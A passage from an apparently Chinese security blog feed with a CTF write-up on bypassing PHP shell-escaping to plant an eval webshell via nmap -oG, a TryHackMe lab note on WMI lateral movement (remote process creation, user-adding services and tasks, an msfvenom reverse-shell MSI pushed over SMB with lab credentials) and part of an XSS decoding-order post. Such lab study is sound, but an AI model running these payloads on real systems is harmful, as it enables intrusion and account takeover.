(`)：转义为 ``````。</span><br><span class="line">感叹号 (!)：转义为 \!。</span><br><span class="line">分号 (;)：转义为 \;。</span><br><span class="line">大于号 (&gt;)：转义为 \&gt;。</span><br><span class="line">小于号 (&lt;)：转义为 \&lt;。</span><br><span class="line">垂直线 (|)：转义为 \|。</span><br><span class="line">与号 (&amp;)：转义为 \&amp;。</span><br><span class="line">空格 ( )：转义为 \ 。</span><br><span class="line"></span><br><span class="line">传入的参数是：172.17.0.2&#x27; -v -d a=1</span><br><span class="line"></span><br><span class="line">经过escapeshellarg处理后变成了</span><br><span class="line">&#x27;172.17.0.2&#x27;\&#x27;&#x27; -v -d a=1&#x27;，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</span><br><span class="line"></span><br><span class="line">经过escapeshellcmd处理后变成&#x27;172.17.0.2&#x27;\\&#x27;&#x27; -v -d a=1\&#x27;，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php</span><br><span class="line">最后执行的命令是curl &#x27;172.17.0.2&#x27;\\&#x27;&#x27; -v -d a=1\&#x27;，由于中间的\\被解释为\而不再是转义字符，所以后面的&#x27;没有被转义，与再后面的&#x27;配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1&#x27;，即向172.17.0.2\发起请求，POST 数据为a=1&#x27;。</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])`**:</span><br><span class="line">    </span><br><span class="line">    - 检查是否存在HTTP请求头`X-Forwarded-For`。这个头部通常由代理服务器添加，用于标识客户端的原始IP地址。</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    - 如果`X-Forwarded-For`存在，则将`<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]`设置为其值。通常，`<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]`包含直接连接到服务器的IP地址，而不是原始客户端的IP地址。</span><br></pre></td></tr></table></figure><p>通常在代理服务器上使用xff</p><p>这道题其实这个xff没有用，最主要还是两个php转义函数的绕过，但是问题就出现在<br>system函数里拼接了nmap的指令字符串。nmap中的-oG参数可以将代码与命令写到文件中，比如nmap <?php phpinfo();?> -oG 1.php从而像一个文件包含的日志注入一样</p><h4 id="PAYLOADS"><a href="#PAYLOADS" class="headerlink" title="PAYLOADS"></a>PAYLOADS</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?host=&#x27;127.0.0.1 &lt;?php eval($_POST[&quot;cmd&quot;]);?&gt; -oG 1.php &#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">如果我们直接传入这个，只会被当成字符串无法写入马</span><br><span class="line">那么我们在传入参数的前面添加单引号，后面空格加单引号</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;127.0.0.1 &lt;?php @eval();?&gt; -oG hack.php &#x27;</span></span><br><span class="line"></span><br><span class="line">传进去后变成</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;</span><span class="number">127.0</span>.<span class="number">0.1</span> <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>();<span class="meta">?&gt;</span> -oG hack.php <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">经过escapeshellarg函数处理</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;\&#x27;127.0.0.1 &lt;?php @eval();?&gt; -oG hack.php \&#x27;&#x27;</span></span><br><span class="line"><span class="comment">//在转义的单引号左右添加单引号</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>\<span class="string">&#x27;&#x27;</span><span class="number">127.0</span>.<span class="number">0.1</span> <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>();<span class="meta">?&gt;</span> -oG hack.php <span class="string">&#x27;\&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">经过escapeshellcmd函数处理</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;\\&#x27;</span><span class="string">&#x27;127.0.0.1 &lt;?php @eval();?&gt; -oG hack.php &#x27;</span>\\<span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">执行结果会对目标\127.0.0.1发送命令&lt;?php @eval();?&gt; -oG hack.php \写入文件</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>注意最后的空格，不然后缀可能发生变化。</p><p><a href="http://3729db78-01b0-4531-810b-cf1d4a00fbc5.node5.buuoj.cn:81/">http://3729db78-01b0-4531-810b-cf1d4a00fbc5.node5.buuoj.cn:81</a><br><a href="http://3729db78-01b0-4531-810b-cf1d4a00fbc5.node5.buuoj.cn:81/a">http://3729db78-01b0-4531-810b-cf1d4a00fbc5.node5.buuoj.cn:81/a</a><br><a href="http://3729db78-01b0-4531-810b-cf1d4a00fbc5.node5.buuoj.cn:81/search.php">http://3729db78-01b0-4531-810b-cf1d4a00fbc5.node5.buuoj.cn:81/./search.php</a><br><a href="http://3729db78-01b0-4531-810b-cf1d4a00fbc5.node5.buuoj.cn:81/delete.php">http://3729db78-01b0-4531-810b-cf1d4a00fbc5.node5.buuoj.cn:81/./delete.php</a><br><a href="http://3729db78-01b0-4531-810b-cf1d4a00fbc5.node5.buuoj.cn:81/confirm.php">http://3729db78-01b0-4531-810b-cf1d4a00fbc5.node5.buuoj.cn:81/./confirm.php</a><br><a href="http://3729db78-01b0-4531-810b-cf1d4a00fbc5.node5.buuoj.cn:81/change.php">http://3729db78-01b0-4531-810b-cf1d4a00fbc5.node5.buuoj.cn:81/./change.php</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>横向移动-WMI</title>
      <link href="/2024/09/10/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-WMI/"/>
      <url>/2024/09/10/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-WMI/</url>
      
        <content type="html"><![CDATA[<h4 id="什么是WMI"><a href="#什么是WMI" class="headerlink" title="什么是WMI?"></a>什么是WMI?</h4><p>WMI是基于 Web 的企业管理 (WBEM) 的 Windows 实现，WBEM 是跨设备访问管理信息的企业标准。<br>WBEM（Web-Based Enterprise Management）是一个开放标准，用于跨平台和跨设备的管理信息访问。WMI（Windows Management Instrumentation）是WBEM的Windows实现，它将WBEM标准应用于Windows环境，以提供系统管理和自动化功能。WMI在Windows系统中提供了一组用于查询和操作管理信息的接口和工具。</p><p>***连接到WMI</p><p>连接到 WMI（Windows Management Instrumentation）之后，你可以管理和查询对应的系统。WMI 是 Windows 操作系统的一个组件，它允许你访问和操作系统的管理数据和功能。</p><p>通过 WMI，你可以执行各种操作，例如：</p><ul><li><strong>查询系统信息</strong>：获取系统硬件、操作系统、网络配置等信息。</li><li><strong>管理系统资源</strong>：创建、删除、或修改文件和进程，管理服务等。</li><li><strong>执行系统操作</strong>：启动、停止、重启服务或进程，设置系统属性等。</li></ul><p>所以如同我们连接所有的系统一样我们都需要凭据，同时WMI还需要指定一个连接的方式。<br>**准备凭据</p><p><em>一个很重要的点，我们连接wmi一定要是管理员</em></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="string">&#x27;Administrator&#x27;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&#x27;Mypass123&#x27;</span>;</span><br><span class="line"><span class="variable">$securePassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="variable">$password</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span>;</span><br><span class="line"><span class="variable">$credential</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential <span class="variable">$username</span>, <span class="variable">$securePassword</span>;</span><br></pre></td></tr></table></figure><p>稍微解释一下</p><ol><li><code>$username</code> 和 <code>$password</code> 分别存储用户名和密码。</li><li><code>ConvertTo-SecureString</code> 将密码字符串转换为安全字符串对象，确保密码以加密方式存储。</li><li><code>New-Object System.Management.Automation.PSCredential</code> 创建一个 <code>PSCredential</code> 对象，结合用户名和安全字符串密码，用于进行需要身份验证的操作</li></ol><h2 id="连接方式"><a href="#连接方式" class="headerlink" title="**连接方式"></a>**连接方式</h2><pre><code>**DCOM：** RPC over IP 将用于连接到 WMI。该协议使用端口 135/ TCP和端口 49152-65535/ TCP ，正如使用 sc.exe 时所解释的那样。</code></pre><p>-<br>    <strong>Wsman：</strong> WinRM 将用于连接到 WMI。此协议使用端口 5985&#x2F;TCP (WinRM HTTP ) 或 5986&#x2F; TCP (WinRM HTTPS)。</p><p>***开始连接</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Opt</span> = <span class="built_in">New-CimSessionOption</span> <span class="literal">-Protocol</span> DCOM</span><br><span class="line"><span class="variable">$Session</span> = <span class="built_in">New-Cimsession</span> <span class="literal">-ComputerName</span> TARGET <span class="literal">-Credential</span> <span class="variable">$credential</span> <span class="literal">-SessionOption</span> <span class="variable">$Opt</span> <span class="literal">-ErrorAction</span> Stop</span><br></pre></td></tr></table></figure><ol><li><p><strong><code>$Opt = New-CimSessionOption -Protocol DCOM</code></strong>：创建一个 CIM 会话选项对象，指定协议为 DCOM（Distributed Component Object Model）。DCOM 是一种用于网络上的对象通信的协议。</p></li><li><p><strong><code>$Session = New-CimSession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop</code></strong>：建立一个新的 CIM 会话。参数包括：</p><ul><li><code>-ComputerName TARGET</code>：指定目标计算机的名称或 IP 地址。</li><li><code>-Credential $credential</code>：传递之前创建的凭据对象，以便进行认证。</li><li><code>-SessionOption $Opt</code>：应用前面创建的会话选项（即 DCOM 协议）。</li><li><code>-ErrorAction Stop</code>：在发生错误时立即停止执行并抛出异常。</li></ul></li></ol><p>其实到这里，已经发现其实wmi是wbem的实现，那么他就是一个windows的组件，我们可以连接到远程计算机上的wmi然后开始使用wmi进行一个针对于系统的管理。</p><h3 id="WMI的一些利用"><a href="#WMI的一些利用" class="headerlink" title="WMI的一些利用"></a>WMI的一些利用</h3><h5 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h5><p>我们可以利用 Windows Management Instrumentation ( WMI ) 从 Powershell 远程生成一个进程，向 Win32_Process 类发送WMI请求，以在我们之前创建的会话下生成该进程</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Command</span> = <span class="string">&quot;powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Invoke-CimMethod</span> <span class="literal">-CimSession</span> <span class="variable">$Session</span> <span class="literal">-ClassName</span> Win32_Process <span class="literal">-MethodName</span> Create <span class="literal">-Arguments</span> <span class="selector-tag">@</span>&#123;</span><br><span class="line">CommandLine = <span class="variable">$Command</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到现在才发现，wmi没有一个交互我们的session就是我们连接之后的标志。把session带入到一个执行命令的powershell命令中。在以前的旧系统中可以使用wmic在命令行中直接连接wmi。<br><code>wmic</code> 确实被视为较旧的工具，主要因为它在 Windows 10 和 Windows Server 2019 及更高版本中逐渐被 PowerShell 替代。PowerShell 提供了更强大和灵活的功能，且与现代 Windows 系统更兼容。<code>wmic</code> 工具可能在未来的 Windows 版本中被逐步淘汰，因此推荐使用 PowerShell 的 <code>CimCmdlets</code> 或 <code>Get-WmiObject</code> 等命令进行类似的操作。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process <span class="keyword">call</span> create &quot;<span class="built_in">cmd</span>.exe /c calc.exe&quot; </span><br></pre></td></tr></table></figure><h5 id="创建服务"><a href="#创建服务" class="headerlink" title="创建服务"></a>创建服务</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-CimMethod</span> <span class="literal">-CimSession</span> <span class="variable">$Session</span> <span class="literal">-ClassName</span> Win32_Service <span class="literal">-MethodName</span> </span><br><span class="line"><span class="comment"># 利用我们的连接session</span></span><br><span class="line">Create <span class="literal">-Arguments</span> <span class="selector-tag">@</span>&#123;</span><br><span class="line">Name = <span class="string">&quot;THMService2&quot;</span>;</span><br><span class="line"><span class="comment"># 创建一个THMService2的服务</span></span><br><span class="line">DisplayName = <span class="string">&quot;THMService2&quot;</span>;</span><br><span class="line">PathName = <span class="string">&quot;net user munra2 Pass123 /add&quot;</span>; <span class="comment"># payload</span></span><br><span class="line">ServiceType = [<span class="built_in">byte</span>]::Parse(<span class="string">&quot;16&quot;</span>); <span class="comment"># Win32OwnProcess : Start service in a new process</span></span><br><span class="line">StartMode = <span class="string">&quot;Manual&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以启动对应</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Service</span> = <span class="built_in">Get-CimInstance</span> <span class="literal">-CimSession</span> <span class="variable">$Session</span> <span class="literal">-ClassName</span> Win32_Service <span class="literal">-filter</span> <span class="string">&quot;Name LIKE &#x27;THMService2&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Invoke-CimMethod</span> <span class="literal">-InputObject</span> <span class="variable">$Service</span> <span class="literal">-MethodName</span> StartService</span><br></pre></td></tr></table></figure><p>删除服务</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-CimMethod</span> <span class="literal">-InputObject</span> <span class="variable">$Service</span> <span class="literal">-MethodName</span> StopService</span><br><span class="line"><span class="built_in">Invoke-CimMethod</span> <span class="literal">-InputObject</span> <span class="variable">$Service</span> <span class="literal">-MethodName</span> Delete</span><br></pre></td></tr></table></figure><h5 id="创建计划任务"><a href="#创建计划任务" class="headerlink" title="创建计划任务"></a>创建计划任务</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Payload must be split in Command and Args</span></span><br><span class="line"><span class="variable">$Command</span> = <span class="string">&quot;cmd.exe&quot;</span></span><br><span class="line"><span class="variable">$Arg1</span> = <span class="string">&quot;/c net user munra22 aSdf1234 /add&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$Action</span> = <span class="built_in">New-ScheduledTaskAction</span> <span class="literal">-CimSession</span> <span class="variable">$Session</span> <span class="literal">-Execute</span> <span class="variable">$Command</span> <span class="literal">-Argument</span> <span class="variable">$Arg1</span></span><br><span class="line"><span class="built_in">Register-ScheduledTask</span> <span class="literal">-CimSession</span> <span class="variable">$Session</span> <span class="literal">-Action</span> <span class="variable">$Action</span> <span class="literal">-User</span> <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span> <span class="literal">-TaskName</span> <span class="string">&quot;THMtask2&quot;</span></span><br><span class="line"><span class="built_in">Start-ScheduledTask</span> <span class="literal">-CimSession</span> <span class="variable">$Session</span> <span class="literal">-TaskName</span> <span class="string">&quot;THMtask2&quot;</span></span><br></pre></td></tr></table></figure><p>***删除定时任务</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Unregister-ScheduledTask</span> <span class="literal">-CimSession</span> <span class="variable">$Session</span> <span class="literal">-TaskName</span> <span class="string">&quot;THMtask2&quot;</span></span><br></pre></td></tr></table></figure><h5 id="安装msi程序"><a href="#安装msi程序" class="headerlink" title="安装msi程序"></a>安装msi程序</h5><p>MSI 是<br>一种用于安装程序的文件格式。如果我们可以将 MSI 包复制到目标系统，那么我们就可以使用 WMI 尝试为我们安装它。攻击者可以通过任何可用的方式复制该文件。一旦 MSI 文件位于目标系统中，我们就可以尝试通过WMI调用 Win32_Product 类来安装</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-CimMethod</span> <span class="literal">-CimSession</span> <span class="variable">$Session</span> <span class="literal">-ClassName</span> Win32_Product <span class="literal">-MethodName</span> Install <span class="literal">-Arguments</span> <span class="selector-tag">@</span>&#123;PackageLocation = <span class="string">&quot;C:\Windows\myinstaller.msi&quot;</span>; Options = <span class="string">&quot;&quot;</span>; AllUsers = <span class="variable">$false</span>&#125;</span><br></pre></td></tr></table></figure><p>同样在旧系统</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:TARGET /user:DOMAIN\USER product <span class="keyword">call</span> install PackageLocation=c:\Windows\myinstaller.msi</span><br></pre></td></tr></table></figure><h3 id="稍微总结"><a href="#稍微总结" class="headerlink" title="稍微总结"></a>稍微总结</h3><p>可以看到我们使用了windows的一个组件叫做WMI但其实我发现他更多的可能是简便了一些我们横向时候的操作，不需要重复的进行凭证验证。同时我们使用wmi可能更加的隐蔽。正如我们进行红队测试时候我们更多的是进行一些隐蔽的思量和思考。</p><h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p>***首先需要一个管理员的凭据</p><p><strong>用户：</strong> ZA.TRYHACKME.COM\t1_corine.waters<br><strong>密码：</strong> Korine.1994</p><p>具体的环境搭建不做赘述。</p><p><em>先连接到对应的thmjmp2上</em><br>相关凭据:   Username:  henry.bird  Password:  Changeme123</p><p>具体实验步骤不做具体的描述，我们只尝试几个payload，和几种移动利用的方式。</p><h5 id="先连接WMI"><a href="#先连接WMI" class="headerlink" title="先连接WMI"></a>先连接WMI</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="string">&#x27;ZA.TRYHACKME.COM\t1_corine.waters&#x27;</span>;</span><br><span class="line"><span class="comment">#做好凭据生成</span></span><br><span class="line"><span class="variable">$password</span> = <span class="string">&#x27;Korine.1994&#x27;</span>;</span><br><span class="line"><span class="variable">$securePassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="variable">$password</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span>;</span><br><span class="line"><span class="variable">$credential</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential <span class="variable">$username</span>, <span class="variable">$securePassword</span>;</span><br><span class="line"><span class="comment"># 做一个连接协议的 判定和选择  并且得到对应的会话</span></span><br><span class="line"><span class="variable">$Opt</span> = <span class="built_in">New-CimSessionOption</span> <span class="literal">-Protocol</span> DCOM</span><br><span class="line"><span class="variable">$Session</span> = <span class="built_in">New-Cimsession</span> <span class="literal">-ComputerName</span> thmiis.za.tryhackme.com <span class="literal">-Credential</span> <span class="variable">$credential</span> <span class="literal">-SessionOption</span> <span class="variable">$Opt</span> <span class="literal">-ErrorAction</span> Stop</span><br></pre></td></tr></table></figure><p>在cmd中写一个ps1脚本，直接批量执行</p><p><em>验证连接:</em></p><h6 id="1-使用-wmic-命令"><a href="#1-使用-wmic-命令" class="headerlink" title="1. 使用 wmic 命令"></a>1. 使用 <code>wmic</code> 命令</h6><p>打开命令提示符（cmd）并输入以下命令：</p><p><code>wmic os get caption</code><br>如果你能看到 Windows 操作系统的名称和版本，这表明你已成功连接到 WMI。</p><h6 id="2-使用-PowerShell"><a href="#2-使用-PowerShell" class="headerlink" title="2. 使用 PowerShell"></a>2. 使用 PowerShell</h6><p>打开 PowerShell 并输入以下命令：</p><p><code>Get-WmiObject -Class Win32_OperatingSystem</code></p><h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240910195837.png" alt="image.png"></p><p>其实就是连接上wmi之后可以看到一个相应的session 可以看到，直接利用session进行系统相关的管理。此时我们可以测试一下，我们创建的用户登录对应thmiis系统。<br>具体脚本[[#创建计划任务]]<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240910200936.png" alt="image.png"><br>可以看到我们的计划任务成功执行。 已经成功登录对应的thmiis系统。</p><h4 id="安装msi"><a href="#安装msi" class="headerlink" title="安装msi"></a>安装msi</h4><p>我刚才仔细地考虑了一下，如果说是为了隐蔽的话。使用wmi进行一些系统管理，并且利用msi安装程序更隐蔽。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell/reverse_tcp -f msi LHOST=10.50.148.56 LPORT=4444 -o k1t0service.msi</span><br></pre></td></tr></table></figure><p>需要把msi先传递上去。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -c &#x27;put k1t0service.msi&#x27; -U t1_corine.waters -W ZA &#x27;//thmiis.za.tryhackme.com/admin$/&#x27; Korine.1994</span><br></pre></td></tr></table></figure><p>可以看到，我们之前已经连接到了wmi 的 session ,具体的监听不做赘述。<br>此时就直接可以调用session,直接开始安装对应的msi程序。[[WMI#安装msi程序]]</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 横向移动 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浏览器解码顺序和解析顺序for-xss</title>
      <link href="/2024/09/09/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E7%A0%81%E9%A1%BA%E5%BA%8F%E5%92%8C%E8%A7%A3%E6%9E%90%E9%A1%BA%E5%BA%8Ffor-xss/"/>
      <url>/2024/09/09/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E7%A0%81%E9%A1%BA%E5%BA%8F%E5%92%8C%E8%A7%A3%E6%9E%90%E9%A1%BA%E5%BA%8Ffor-xss/</url>
      
        <content type="html"><![CDATA[<h4 id="数据包处理过程"><a href="#数据包处理过程" class="headerlink" title="**数据包处理过程"></a>**数据包处理过程</h4><p>首先要了解我们在构造xss包的时候发生了什么：</p><p>1、在浏览器的地址栏中输入url，发送http请求头和数据；<br>2、数据包通过网络传输到达远程web,服务器接收到url，分析请求头，根据它找到对应资源，经过后端代码进行处理（过滤，校验），然后给前端返回响应头和数据；<br>3、浏览器接收到响应的数据后，对数据进行解析（下面要说的事）</p><h4 id="浏览器解析顺序"><a href="#浏览器解析顺序" class="headerlink" title="浏览器解析顺序"></a><strong>浏览器解析顺序</strong></h4><p>1  浏览器接收到响应数据后，解析器先对HTML之类的文档进行解析，构建成DOM节点树，同时，CSS会被CSS解析器解析生成样式表。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span>、 解析html标签过程中遇到&lt;script&gt;标签，则暂停<span class="variable constant_">HTML</span>标签解析，控制权转交给<span class="title class_">JavaScript</span>引擎，执行完后继续解析html，js可以对<span class="variable constant_">DOM</span>进行修改。</span><br></pre></td></tr></table></figure><p>***dom树</p><p>DOM 树（文档对象模型树）是浏览器解析 HTML 时构建的内部数据结构，表示文档的结构和内容。它将 HTML 文档转化为一个树形结构，其中每个节点代表文档中的一个元素、属性或文本内容。解析 HTML 时，浏览器按照 DOM 树的结构来理解和操作页面的内容和元素，这使得 JavaScript 能够访问和修改页面的内容和结构。通过 DOM 树，脚本可以动态地操作页面，使其与用户的交互需求相匹配。</p><p>如果在这个时候，如果修改一下，比如说把</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Main Title<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>用html编码成：</span><br><span class="line"></span><br><span class="line">&lt;<span class="symbol">&amp;#104;</span>1&gt;Main Title<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>M<span class="symbol">&amp;#97;</span>inT<span class="symbol">&amp;#105;</span>tle<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p>前者对标签名编码，后者对标签内容编码，结果会发现前者没有了html标签的作用，而后者正常显示。由此可以明白HTML解码的时机：它是在浏览器构建完DOM树以后才进行解码的，当解析器对前者进行解析时，无法识别为html标签，所以构建不了DOM节点，后者在顺利构建完DOM树之后对节点内容进行解码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">尾部的script脚本中改变了DOM节点树，通过对<span class="tag">&lt;<span class="name">div</span>&gt;</span>操作新增了一个<span class="tag">&lt;<span class="name">img</span>&gt;</span>，所以通过调换<span class="tag">&lt;<span class="name">script</span>&gt;</span>和img的先后顺序，会使得弹框的顺序不同。</span><br></pre></td></tr></table></figure><p><img src="https://ask.qcloudimg.com/http-save/yehe-6367947/k8plxaz0ag.jpeg"></p><p>如果 <code>&lt;script&gt;</code> 标签放在 <code>&lt;head&gt;</code> 中且没有使用 <code>defer</code> 或 <code>async</code> 属性，JavaScript 代码会在 DOM 树构建完成之前立即执行。这可能会导致脚本尝试操作尚未构建的 DOM 元素，从而引发错误。</p><p>在这种情况下，浏览器会暂停 HTML 的解析，先执行 JavaScript 代码，然后再继续解析 HTML。这种行为可能会导致页面加载变慢。为了避免这种问题，可以将 <code>&lt;script&gt;</code> 标签放在 <code>&lt;body&gt;</code> 的底部，或使用 <code>defer</code> 和 <code>async</code> 属性来优化脚本的加载和执行时机。<br>所以可以看到我们的解析顺序，就是会收到影响，会使得我们的解析顺序发生改变。</p><h3 id="浏览器的解码顺序："><a href="#浏览器的解码顺序：" class="headerlink" title="浏览器的解码顺序："></a><strong>浏览器的解码顺序：</strong></h3><p>首先要强调是一点是：浏览器的解码顺序和解析顺序是两码事。浏览器一般的解码顺序是先进行html解码，再进行javascript解码，最后再进行url解码，需要注意的是这里的url解码和我们发送到服务器的url解码不同，那个过程是由服务器来完成的，而不是浏览器。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">明白了这个顺序，我们就可以理解<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">alert<span class="symbol">&amp;#40;</span>&#x27;1&#x27;)</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>是无法弹框的，因为script标签内无法解析HTML实体编码。</span><br></pre></td></tr></table></figure><p>简单的来说浏览器接受到内容后首先进行html解析，首先将识别到的标签转化为DOM树，而在这一过程中浏览器是无法识别html实体编码的，只有建立起DOM树才能对每个节点的内容进行识别，如果出现html实体编码，则会进行解码。</p><p>举个简单的例子，在XSS中如果页面可以通过用户输入的内容构造新标签，此时为了绕过过滤进行html编码。s编码为&#115;,那么形如&lt;img &#115;rc&#x3D;0 onerror&#x3D;alert(1)这种payload是无法正常运行的,因为破坏了标签内的属性名src导致html解析时不会正确识别img标签无法进行DOM树构建，自然也就无法进行html实体解码过程。具体的构建DOM树的过程在下文浏览器的解析流中会具体阐述。</p><p>在此基础上，JavaScript DOM API 参与进来，可以对DOM 树进行修改，改变DOM树的结构和内容。而此时，CSS解析器则解析外部CSS 文件以及Style 标签中的样式内容，这些信息将搭配HTML 中的可见指令构建起一个Rendering 